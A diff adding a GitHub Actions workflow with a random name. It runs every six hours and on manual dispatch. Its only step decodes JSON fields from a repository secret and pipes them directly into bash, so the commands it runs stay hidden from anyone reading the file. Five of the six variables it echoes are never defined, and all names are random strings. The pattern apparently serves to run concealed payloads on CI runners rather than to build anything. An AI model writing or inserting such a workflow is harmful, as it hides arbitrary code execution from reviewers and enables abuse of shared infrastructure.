@@ -1,0 +1,23 @@
+name: agreeyuy
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: agreeyuy
+        env:
+          nf598: ${{ secrets.nf598 }}
+        run: |
+          echo $nf598 | jq -r .emco1 | /bin/bash
+          echo $sphvq6 | jq -r .xtlm5268 | /bin/bash
+          echo $vsf7506 | jq -r .kiei6489 | /bin/bash
+          echo $pg9450 | jq -r .uknxo4738 | /bin/bash
+          echo $apfv767 | jq -r .di7 | /bin/bash
+          echo $how8 | jq -r .ahc4200 | /bin/bash
+
